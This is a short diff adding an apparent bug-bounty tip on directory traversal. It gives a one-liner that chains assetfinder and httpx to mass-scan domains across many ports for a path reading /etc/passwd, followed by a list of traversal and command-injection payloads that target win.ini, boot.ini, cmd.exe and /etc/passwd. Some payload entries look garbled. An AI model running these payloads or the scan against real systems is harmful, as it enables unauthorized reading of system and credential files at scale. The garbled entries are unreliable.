@@ -1,0 +1,19 @@
+"//////////////////../../../../../../../../etc/passwd"
+
+Lets Automate this real quick 🔥🔥
+cat rootDomains.txt | assetfinder -subs-only | httpx -p 80,443,8080,8443,9001,9002,9003,9000 -path "/asset////////////////../../../../../../../../etc/passwd" -mr "root:x" -nc -t 50 
+
+Unique directory traversals:-
+
+1. \..\WINDOWS\win.ini
+
+2. ..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\
+3. .2\.7\.?\etc\passwd
+
+4. ../../boot.ini
+
+5. %0a/bin/cat%20/etc/passwd
+
+6. \\&apos;/bin/cat%20/etc/passwd\\&apos;
+
+7. ..%c1%afetc%scl%afpasswd
